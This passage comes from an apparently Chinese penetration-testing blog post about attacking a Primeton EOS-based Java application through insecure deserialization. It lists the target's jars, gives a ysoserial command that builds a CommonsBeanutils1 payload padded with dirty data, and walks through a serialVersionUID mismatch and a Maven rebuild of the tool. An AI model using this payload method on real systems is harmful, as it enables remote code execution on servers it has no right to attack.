class="token operator">-</span><span class="token number">3.0</span><span class="token number">.6</span><span class="token punctuation">.</span>jarcom<span class="token punctuation">.</span>primeton<span class="token punctuation">.</span>components<span class="token punctuation">.</span>taskcenter<span class="token punctuation">.</span>rpf<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.6</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>beanutils<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.1</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>codec<span class="token operator">-</span><span class="token number">1.2</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>codec<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>collections<span class="token operator">-</span><span class="token number">3.2</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>collections4<span class="token operator">-</span><span class="token number">4.1</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>compress<span class="token operator">-</span><span class="token number">1.12</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>configuration<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>dbcp<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>digester<span class="token operator">-</span><span class="token number">1.8</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>email<span class="token operator">-</span><span class="token number">1.1</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>fileupload<span class="token operator">-</span><span class="token number">1.1</span><span class="token number">.1</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>fileupload<span class="token operator">-</span><span class="token number">1.2</span><span class="token number">.1</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>httpclient<span class="token operator">-</span><span class="token number">3.0</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>io<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>io<span class="token operator">-</span><span class="token number">1.4</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>jexl<span class="token operator">-</span><span class="token number">1.1</span><span class="token number">.1</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>jxpath<span class="token operator">-</span><span class="token number">1.2</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>lang<span class="token operator">-</span><span class="token number">2.1</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>logging<span class="token operator">-</span><span class="token number">1.0</span><span class="token number">.4</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>math<span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>pool<span class="token operator">-</span><span class="token number">1.2</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>pool<span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>vfs<span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">.</span>jarcore4wl<span class="token punctuation">.</span>jarcos<span class="token operator">-</span><span class="token number">0.</span>x<span class="token punctuation">.</span>jardatalogic<span class="token punctuation">.</span>jardatastaxcli<span class="token punctuation">.</span>jardatetimeformat<span class="token punctuation">.</span>jardm<span class="token punctuation">.</span>jardmgraph<span class="token punctuation">.</span>jardm_report<span class="token punctuation">.</span>jardom4j<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.1</span><span class="token punctuation">.</span>jarecj<span class="token operator">-</span><span class="token number">4.2</span><span class="token number">.1</span><span class="token punctuation">.</span>jareigenbase<span class="token operator">-</span>properties<span class="token operator">-</span><span class="token number">1.1</span><span class="token number">.0</span><span class="token punctuation">.</span>jareigenbase<span class="token operator">-</span>resgen<span class="token operator">-</span><span class="token number">1.3</span><span class="token number">.0</span><span class="token punctuation">.</span>jareigenbase<span class="token operator">-</span>xom<span class="token operator">-</span><span class="token number">1.3</span><span class="token number">.0</span><span class="token punctuation">.</span>jareos<span class="token operator">-</span>server<span class="token operator">-</span>access<span class="token operator">-</span><span class="token number">7.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jareos<span class="token operator">-</span>server<span class="token operator">-</span>access<span class="token operator">-</span>ejb<span class="token operator">-</span><span class="token number">7.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jareos<span class="token operator">-</span>server<span class="token operator">-</span>common<span class="token operator">-</span><span class="token number">7.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jareos<span class="token operator">-</span>server<span class="token operator">-</span>das<span class="token operator">-</span><span class="token number">7.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jareos<span class="token operator">-</span>server<span class="token operator">-</span>data<span class="token operator">-</span><span class="token number">7.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jareos<span class="token operator">-</span>server<span class="token operator">-</span>engine<span class="token operator">-</span><span class="token number">7.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jareos<span class="token operator">-</span>server<span class="token operator">-</span>runtime<span class="token operator">-</span><span class="token number">7.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jareos<span class="token operator">-</span>server<span class="token operator">-</span>sca<span class="token operator">-</span><span class="token number">7.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jareos<span class="token operator">-</span>server<span class="token operator">-</span>spring<span class="token operator">-</span><span class="token number">7.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jareos<span class="token operator">-</span>server<span class="token operator">-</span>system<span class="token operator">-</span><span class="token number">7.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jar<span class="token class-name">EOS3Encode</span><span class="token punctuation">.</span>jarexcel2007<span class="token punctuation">.</span>jarexcelcli<span class="token punctuation">.</span>jarfastjson<span class="token operator">-</span><span class="token number">1.2</span><span class="token number">.5</span><span class="token punctuation">.</span>jarfileupload<span class="token operator">-</span>progress<span class="token operator">-</span><span class="token number">0.</span>x<span class="token punctuation">.</span>jarftpcli<span class="token punctuation">.</span>jargeronimo<span class="token operator">-</span>commonj_1<span class="token punctuation">.</span><span class="token number">1_</span>spec<span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">.</span>jargeronimo<span class="token operator">-</span>stax<span class="token operator">-</span>api_1<span class="token punctuation">.</span><span class="token number">0_</span>spec<span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">.</span>jarguide<span class="token punctuation">.</span>jarhbasecli<span class="token punctuation">.</span>jarhdfsfilecli<span class="token punctuation">.</span>jarhessian<span class="token operator">-</span>jdk1<span class="token punctuation">.</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.20</span><span class="token punctuation">.</span>jarhivecli<span class="token punctuation">.</span>jarhtmlparser<span class="token operator">-</span><span class="token number">1.6</span><span class="token punctuation">.</span>jarhttpclient<span class="token operator">-</span><span class="token number">4.2</span><span class="token number">.5</span><span class="token punctuation">.</span>jarhttpcore<span class="token operator">-</span><span class="token number">4.2</span><span class="token number">.4</span><span class="token punctuation">.</span>jaricu4j_3_4_5<span class="token punctuation">.</span>jaritext2_rq<span class="token punctuation">.</span>jaritext5<span class="token operator">-</span>itextpdf<span class="token operator">-</span><span class="token number">5.5</span><span class="token number">.11</span><span class="token punctuation">.</span>jarjackson<span class="token operator">-</span>core<span class="token operator">-</span>asl<span class="token operator">-</span><span class="token number">1.9</span><span class="token number">.12</span><span class="token punctuation">.</span>jarjackson<span class="token operator">-</span>jaxrs<span class="token operator">-</span><span class="token number">1.9</span><span class="token number">.12</span><span class="token punctuation">.</span>jarjackson<span class="token operator">-</span>mapper<span class="token operator">-</span>asl<span class="token operator">-</span><span class="token number">1.9</span><span class="token number">.12</span><span class="token punctuation">.</span>jarjackson<span class="token operator">-</span>xc<span class="token operator">-</span><span class="token number">1.9</span><span class="token number">.12</span><span class="token punctuation">.</span>jarjai_codec<span class="token punctuation">.</span>jarjai_core<span class="token punctuation">.</span>jarjavassist<span class="token operator">-</span><span class="token number">3.3</span><span class="token punctuation">.</span>jarjavax<span class="token punctuation">.</span>ejb<span class="token operator">-</span><span class="token number">2.1</span><span class="token punctuation">.</span>jarjavax<span class="token punctuation">.</span>jms<span class="token operator">-</span><span class="token number">1.1</span><span class="token punctuation">.</span>jarjavax<span class="token punctuation">.</span>transaction<span class="token operator">-</span><span class="token number">0.</span>x<span class="token punctuation">.</span>jarjaxb<span class="token operator">-</span>api<span class="token operator">-</span><span class="token number">2.1</span><span class="token punctuation">.</span>jarjaxb<span class="token operator">-</span>impl<span class="token operator">-</span><span class="token number">2.1</span><span class="token number">.4</span><span class="token punctuation">.</span>jarjaxb2<span class="token operator">-</span>reflection<span class="token operator">-</span><span class="token number">2.1</span><span class="token number">.4</span><span class="token punctuation">.</span>jarjaxen<span class="token operator">-</span><span class="token number">1.1</span><span class="token number">.1</span><span class="token punctuation">.</span>jarjaxrs<span class="token operator">-</span>api<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.1</span><span class="token punctuation">.</span>jarjaxws<span class="token operator">-</span>api<span class="token operator">-</span><span class="token number">2.1</span><span class="token punctuation">.</span>jarjdom<span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">.</span>jarjdom<span class="token punctuation">.</span>jarjettison<span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">.</span>jarjs<span class="token operator">-</span><span class="token number">1.7</span>R2<span class="token punctuation">.</span>jarjs<span class="token punctuation">.</span>jarjsobject<span class="token punctuation">.</span>jarjson<span class="token punctuation">.</span>jarjson_simple<span class="token operator">-</span><span class="token number">1.1</span><span class="token punctuation">.</span>jarjsr181<span class="token operator">-</span>api<span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">.</span>jarjsr250<span class="token operator">-</span>api<span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">.</span>jarjunit<span class="token operator">-</span><span class="token number">4.10</span><span class="token punctuation">.</span>jarjxl<span class="token punctuation">.</span>jarjxls<span class="token operator">-</span>core<span class="token operator">-</span><span class="token number">0.9</span><span class="token number">.6</span><span class="token punctuation">.</span>jarlog4j<span class="token operator">-</span><span class="token number">1.2</span><span class="token number">.8</span><span class="token punctuation">.</span>jarlog4j<span class="token operator">-</span>over<span class="token operator">-</span>slf4j<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.6</span><span class="token punctuation">.</span>jarmail<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jarmail<span class="token punctuation">.</span>jarmex<span class="token operator">-</span>impl<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jarmondrian<span class="token operator">-</span><span class="token number">3.3</span><span class="token number">.0</span><span class="token punctuation">.</span>jarmx4j<span class="token operator">-</span>tools<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.2</span><span class="token punctuation">.</span>jarneethi<span class="token operator">-</span><span class="token number">2.0</span><span class="token number">.2</span><span class="token punctuation">.</span>jarnekohtml<span class="token operator">-</span><span class="token number">1.9</span><span class="token number">.7</span><span class="token punctuation">.</span>jarnumformat<span class="token punctuation">.</span>jarognl<span class="token operator">-</span><span class="token number">2.6</span><span class="token number">.9</span><span class="token punctuation">.</span>jarolap4j<span class="token operator">-</span><span class="token number">1.0</span><span class="token number">.0</span><span class="token punctuation">.</span>jarolap4jcli<span class="token punctuation">.</span>jarorg<span class="token punctuation">.</span>eclipse<span class="token punctuation">.</span>emf<span class="token punctuation">.</span>common<span class="token operator">-</span><span class="token number">2.2</span><span class="token number">.1</span><span class="token punctuation">.</span>jarorg<span class="token punctuation">.</span>eclipse<span class="token punctuation">.</span>emf<span class="token punctuation">.</span>ecore<span class="token operator">-</span><span class="token number">2.2</span><span class="token number">.1</span><span class="token punctuation">.</span>jarorg<span class="token punctuation">.</span>eclipse<span class="token punctuation">.</span>emf<span class="token punctuation">.</span>ecore<span class="token punctuation">.</span>xmi<span class="token operator">-</span><span class="token number">2.2</span><span class="token number">.1</span><span class="token punctuation">.</span>jarorg<span class="token punctuation">.</span>eclipse<span class="token punctuation">.</span>xsd<span class="token operator">-</span><span class="token number">2.2</span><span class="token number">.1</span><span class="token punctuation">.</span>jarorg<span class="token punctuation">.</span>gocom<span class="token punctuation">.</span>bps<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bizform<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.1</span><span class="token punctuation">.</span>jarorg<span class="token punctuation">.</span>gocom<span class="token punctuation">.</span>bps<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bizform<span class="token punctuation">.</span>components<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.1</span><span class="token punctuation">.</span>jarorg<span class="token punctuation">.</span>gocom<span class="token punctuation">.</span>components<span class="token punctuation">.</span>bpff<span class="token punctuation">.</span>control<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.1</span><span class="token punctuation">.</span>jarorg<span class="token punctuation">.</span>gocom<span class="token punctuation">.</span>components<span class="token punctuation">.</span>taskcenter<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.6</span><span class="token punctuation">.</span>jarpdf<span class="token operator">-</span>transcoder<span class="token punctuation">.</span>jarpoi<span class="token operator">-</span><span class="token number">3.16</span><span class="token punctuation">.</span>jarpoi<span class="token operator">-</span>excelant<span class="token operator">-</span><span class="token number">3.16</span><span class="token punctuation">.</span>jarpoi<span class="token operator">-</span>ooxml<span class="token operator">-</span><span class="token number">3.16</span><span class="token punctuation">.</span>jarpoi<span class="token operator">-</span>ooxml<span class="token operator">-</span>schemas<span class="token operator">-</span><span class="token number">3.16</span><span class="token punctuation">.</span>jarpoi<span class="token operator">-</span>scratchpad<span class="token operator">-</span><span class="token number">3.16</span><span class="token punctuation">.</span>jarpoi2<span class="token punctuation">.</span>jarptp<span class="token operator">-</span>server<span class="token operator">-</span>commons<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jarptp<span class="token operator">-</span>server<span class="token operator">-</span>das<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jarptp<span class="token operator">-</span>server<span class="token operator">-</span>data<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jarptp<span class="token operator">-</span>server<span class="token operator">-</span>datacontext<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jarptp<span class="token operator">-</span>server<span class="token operator">-</span>deploy<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jarptp<span class="token operator">-</span>server<span class="token operator">-</span>engine<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jarptp<span class="token operator">-</span>server<span class="token operator">-</span>jdbc<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jarptp<span class="token operator">-</span>server<span class="token operator">-</span>l7e<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jarptp<span class="token operator">-</span>server<span class="token operator">-</span>runtime<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jarptp<span class="token operator">-</span>server<span class="token operator">-</span>scriptengine<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jarptp<span class="token operator">-</span>server<span class="token operator">-</span>spring<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jarptp<span class="token operator">-</span>server<span class="token operator">-</span>spring4das<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jarptp<span class="token operator">-</span>server<span class="token operator">-</span>statistic<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jarptp<span class="token operator">-</span>server<span class="token operator">-</span>wsclient<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jar<span class="token class-name">Qrcode_swetake</span><span class="token punctuation">.</span>jarquartz<span class="token operator">-</span><span class="token number">1.5</span><span class="token number">.2</span><span class="token punctuation">.</span>jarrampart<span class="token operator">-</span>core<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jarrampart<span class="token operator">-</span>policy<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jarrampart<span class="token operator">-</span>trust<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jarraqsoftReport<span class="token punctuation">.</span>jarrediscli<span class="token punctuation">.</span>jarreport4<span class="token punctuation">.</span>jarreport5StaticHtml<span class="token punctuation">.</span>jarresteasy<span class="token operator">-</span>client<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.1</span><span class="token punctuation">.</span>jarresteasy<span class="token operator">-</span>jackson<span class="token operator">-</span>provider<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.1</span><span class="token punctuation">.</span>jarresteasy<span class="token operator">-</span>jaxrs<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.1</span><span class="token punctuation">.</span>jarresteasy<span class="token operator">-</span>multipart<span class="token operator">-</span>provider<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.1</span><span class="token punctuation">.</span>jarsac<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jarsapcli<span class="token punctuation">.</span>jarsca<span class="token operator">-</span>api<span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">.</span>jarsdo<span class="token operator">-</span>api<span class="token operator">-</span><span class="token number">2.1</span><span class="token number">.0</span><span class="token punctuation">.</span>jarslf4j<span class="token operator">-</span>api<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.6</span><span class="token punctuation">.</span>jarsnmp4j<span class="token operator">-</span><span class="token number">2.3</span><span class="token number">.1</span><span class="token punctuation">.</span>jarsoap<span class="token operator">-</span>api<span class="token operator">-</span><span class="token number">1.3</span><span class="token number">.0</span><span class="token punctuation">.</span>jarsparkcli<span class="token punctuation">.</span>jarspring<span class="token operator">-</span>aop<span class="token operator">-</span><span class="token number">3.2</span><span class="token number">.17</span><span class="token punctuation">.</span>RELEASE<span class="token punctuation">.</span>jarspring<span class="token operator">-</span>beans<span class="token operator">-</span><span class="token number">3.2</span><span class="token number">.17</span><span class="token punctuation">.</span>RELEASE<span class="token punctuation">.</span>jarspring<span class="token operator">-</span>context<span class="token operator">-</span><span class="token number">3.2</span><span class="token number">.17</span><span class="token punctuation">.</span>RELEASE<span class="token punctuation">.</span>jarspring<span class="token operator">-</span>core<span class="token operator">-</span><span class="token number">3.2</span><span class="token number">.17</span><span class="token punctuation">.</span>RELEASE<span class="token punctuation">.</span>jarspring<span class="token operator">-</span>expression<span class="token operator">-</span><span class="token number">3.2</span><span class="token number">.17</span><span class="token punctuation">.</span>RELEASE<span class="token punctuation">.</span>jarspring<span class="token operator">-</span>jdbc<span class="token operator">-</span><span class="token number">3.2</span><span class="token number">.17</span><span class="token punctuation">.</span>RELEASE<span class="token punctuation">.</span>jarspring<span class="token operator">-</span>jms<span class="token operator">-</span><span class="token number">3.2</span><span class="token number">.17</span><span class="token punctuation">.</span>RELEASE<span class="token punctuation">.</span>jarspring<span class="token operator">-</span>tx<span class="token operator">-</span><span class="token number">3.2</span><span class="token number">.17</span><span class="token punctuation">.</span>RELEASE<span class="token punctuation">.</span>jarsso<span class="token operator">-</span>client<span class="token operator">-</span>java<span class="token operator">-</span><span class="token number">7.0</span><span class="token number">.2</span><span class="token punctuation">.</span>jarsso<span class="token operator">-</span>proxy<span class="token operator">-</span><span class="token number">7.0</span><span class="token number">.2</span><span class="token punctuation">.</span>jarstax<span class="token operator">-</span>api<span class="token operator">-</span><span class="token number">1.0</span><span class="token number">.1</span><span class="token punctuation">.</span>jarsubstance<span class="token operator">-</span><span class="token number">7.2</span><span class="token number">.1</span><span class="token punctuation">.</span>jarwebservicecli<span class="token punctuation">.</span>jarwebutil<span class="token punctuation">.</span>jarwsdl4j<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.2</span><span class="token punctuation">.</span>jarwss4j<span class="token operator">-</span><span class="token number">1.5</span><span class="token number">.3</span><span class="token punctuation">.</span>jarxalan<span class="token operator">-</span><span class="token number">2.5</span><span class="token number">.0</span><span class="token punctuation">.</span>jarxalan<span class="token operator">-</span><span class="token number">2.6</span><span class="token number">.0</span><span class="token punctuation">.</span>jarxercesImpl<span class="token operator">-</span><span class="token number">2.8</span><span class="token number">.1</span><span class="token punctuation">.</span>jarxercesImpl<span class="token punctuation">.</span>jarxml<span class="token operator">-</span>apis<span class="token operator">-</span><span class="token number">1.2</span><span class="token number">.01</span><span class="token punctuation">.</span>jarxml<span class="token operator">-</span>apis<span class="token operator">-</span>ext<span class="token punctuation">.</span>jarxml<span class="token operator">-</span>apis<span class="token punctuation">.</span>jarxmlbeans<span class="token operator">-</span><span class="token number">2.3</span><span class="token number">.0</span><span class="token punctuation">.</span>jarxmlbeans<span class="token operator">-</span><span class="token number">2.6</span><span class="token number">.0</span><span class="token punctuation">.</span>jar<span class="token class-name">XmlSchema</span><span class="token operator">-</span><span class="token number">1.3</span><span class="token number">.2</span><span class="token punctuation">.</span>jarxmlsec<span class="token operator">-</span><span class="token number">1.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jarxmlworker<span class="token operator">-</span><span class="token number">5.5</span><span class="token number">.6</span><span class="token punctuation">.</span>jarxstream<span class="token operator">-</span><span class="token number">1.2</span><span class="token number">.2</span><span class="token punctuation">.</span>jarzxing_core<span class="token punctuation">.</span>jar</code></pre><p>从上面的jar包我们知道 commons-collections  commons-beanutils 在加上之前的我们可以猜出。使用的应该是org.apache.commons.beanutils.BeanComparator  commons-beanutils 。所以我们就有目标了直接使用commons-beanutils  进行构造。</p><p>java -jar ysoserial-for-woodpecker-0.5.2.jar -g CommonsBeanutils1 -a raw_cmd:”ping xxxx”  –dirt-data-length 400000 &gt;curl4.cer</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404291724134.png" alt="打失败了"><br>看一下回显我去没有难倒是不出网没漏洞不可能<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404291753731.png" alt="看回显"><br>我们这个时候要看一个关键报错点 serialVersionUID 这个是反序列化的时候必须要带的点。那我们可以推断出来是不是 目标版本和我们工具的版本不一样导致的这种问题。</p><pre class="language-java" data-language="java"><code class="language-java">serialVersionUID <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2044202215314119608</span><span class="token punctuation">,</span> local <span class="token keyword">class</span> serialVersionUID <span class="token operator">=</span> <span class="token number">2573799559215537819</span>u</code></pre><p>转变思路我们使用maven重新编译一下 下载源代码<br><a href="https://github.com/woodpecker-framework/ysoserial-for-woodpecker">https://github.com/woodpecker-framework/ysoserial-for-woodpecker</a></p><p>使用mvn编译报错如下:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token punctuation">[</span>ERROR<span class="token punctuation">]</span> <span class="token class-name">Unknown</span> lifecycle phase <span class="token string">"mvn"</span><span class="token punctuation">.</span> <span class="token class-name">You</span> must specify a valid lifecycle phase or a goal in the format <span class="token operator">&lt;</span>plugin<span class="token operator">-</span>prefix<span class="token operator">></span><span class="token operator">:</span><span class="token generics"><span class="token punctuation">&lt;</span>goal<span class="token punctuation">></span></span> or <span class="token operator">&lt;</span>plugin<span class="token operator">-</span>group<span class="token operator">-</span>id<span class="token operator">></span><span class="token operator">:</span><span class="token operator">&lt;</span>plugin<span class="token operator">-</span>artifact<span class="token operator">-</span>id<span class="token operator">></span><span class="token punctuation">[</span><span class="token operator">:</span><span class="token operator">&lt;</span>plugin<span class="token operator">-</span>version<span class="token operator">></span><span class="token punctuation">]</span><span class="token operator">:</span><span class="token generics"><span class="token punctuation">&lt;</span>goal<span class="token punctuation">></span></span><span class="token punctuation">.</span> <span class="token class-name">Available</span> lifecycle phases are<span class="token operator">:</span> validate<span class="token punctuation">,</span> initialize<span class="token punctuation">,</span> generate<span class="token operator">-</span>sources<span class="token punctuation">,</span> process<span class="token operator">-</span>sources<span class="token punctuation">,</span> generate<span class="token operator">-</span>resources<span class="token punctuation">,</span> process<span class="token operator">-</span>resources<span class="token punctuation">,</span> compile<span class="token punctuation">,</span> process<span class="token operator">-</span>classes<span class="token punctuation">,</span> generate<span class="token operator">-</span>test<span class="token operator">-</span>sources<span class="token punctuation">,</span> process<span class="token operator">-</span>test<span class="token operator">-</span>sources<span class="token punctuation">,</span> generate<span class="token operator">-</span>test<span class="token operator">-</span>resources<span class="token punctuation">,</span> process<span class="token operator">-</span>test<span class="token operator">-</span>resources<span class="token punctuation">,</span> test<span class="token operator">-</span>compile<span class="token punctuation">,</span> process<span class="token operator">-</span>test<span class="token operator">-</span>classes<span class="token punctuation">,</span> test<span class="token punctuation">,</span> prepare<span class="token operator">-</span><span class="token keyword">package</span><span class="token punctuation">,</span> <span class="token keyword">package</span><span class="token punctuation">,</span> pre<span class="token operator">-</span>integration<span class="token operator">-</span>test<span class="token punctuation">,</span> integration<span class="token operator">-</span>test<span class="token punctuation">,</span> post<span class="token operator">-</span>integration<span class="token operator">-</span>test<span class="token punctuation">,</span> verify<span class="token punctuation">,</span> install<span class="token punctuation">,</span> deploy<span class="token punctuation">,</span> pre<span class="token operator">-</span>clean<span class="token punctuation">,</span> clean<span class="token punctuation">,</span> post<span class="token operator">-</span>clean<span class="token punctuation">,</span> pre<span class="token operator">-</span>site<span class="token punctuation">,</span> site<span class="token punctuation">,</span> post<span class="token operator">-</span>site<span class="token punctuation">,</span> site<span class="token operator">-</span>deploy<span class="token punctuation">.</span> <span class="token operator">-></span> <span class="token punctuation">[</span><span class="token class-name">Help</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>maven<span class="token punctuation">.</span>lifecycle<span class="token punctuation">.</span></span>LifecyclePhaseNotFoundException</span><span class="token operator">:</span> <span class="token class-name">Unknown</span> lifecycle phase <span class="token string">"mvn"</span><span class="token punctuation">.</span> <span class="token class-name">You</span> must specify a valid lifecycle phase or a goal in the format <span class="token operator">&lt;</span>plugin<span class="token operator">-</span>prefix<span class="token operator">></span><span class="token operator">:</span><span class="token generics"><span class="token punctuation">&lt;</span>goal<span class="token punctuation">></span></span> or <span class="token operator">&lt;</span>plugin<span class="token operator">-</span>group<span class="token operator">-</span>id<span class="token operator">></span><span class="token operator">:</span><span class="token operator">&lt;</span>plugin<span class="token operator">-</span>artifact<span class="token operator">-</span>id<span class="token operator">></span><span class="token punctuation">[</span><span class="token operator">:</span><span class="token operator">&lt;</span>plugin<span class="token operator">-</span>version<span class="token operator">></span><span class="token punctuation">]</span><span class="token operator">:</span><span class="token generics"><span class="token punctuation">&lt;</span>goal<span class="token punctuation">></span></span><span class="token punctuation">.</span> <span class="token class-name">Available</span> lifecycle phases are<span class="token operator">:</span> validate<span class="token punctuation">,</span> initialize<span class="token punctuation">,</span> generate<span class="token operator">-</span>sources<span class="token punctuation">,</span> process<span class="token operator">-</span>sources<span class="token punctuation">,</span> generate<span class="token operator">-</span>resources<span class="token punctuation">,</span> process<span class="token operator">-</span>resources<span class="token punctuation">,</span> compile<span class="token punctuation">,</span> process<span class="token operator">-</span>classes<span class="token punctuation">,</span> generate<span class="token operator">-</span>test<span class="token operator">-</span>sources<span class="token punctuation">,</span> process<span class="token operator">-</span>test<span class="token operator">-</span>sources<span class="token punctuation">,</span> generate<span class="token operator">-</span>test<span class="token operator">-</span>resources<span class="token punctuation">,</span> process<span class="token operator">-</span>test<span class="token operator">-</span>resources<span class="token punctuation">,</span> test<span class="token operator">-</span>compile<span class="token punctuation">,</span> process<span class="token operator">-</span>test<span class="token operator">-</span>classes<span class="token punctuation">,</span> test<span class="token punctuation">,</span> prepare<span class="token operator">-</span><span class="token keyword">package</span><span class="token punctuation">,</span> <span class="token keyword">package</span><span class="token punctuation">,</span> pre<span class="token operator">-</span>integration<span class="token operator">-</span>test<span class="token punctuation">,</span> integration<span class="token operator">-</span>test<span class="token punctuation">,</span> post<span class="token operator">-</span>integration<span class="token operator">-</span>test<span class="token punctuation">,</span> verify<span class="token punctuation">,</span> install<span class="token punctuation">,</span> deploy<span class="token punctuation">,</span> pre<span class="token operator">-</span>clean<span class="token punctuation">,</span> clean<span class="token punctuation">,</span> post<span class="token operator">-</span>clean<span class="token punctuation">,</span> pre<span class="token operator">-</span>site<span class="token punctuation">,</span> site<span class="token punctuation">,</span> post<span class="token operator">-</span>site<span class="token punctuation">,</span> site<span class="token operator">-</span>deploy<span class="token punctuation">.</span></code></pre><p>我们修改一下pom.xml文件</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>defaultGoal</span><span class="token punctuation">></span></span>compile<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>defaultGoal</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugins</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">></span></span><span class="token 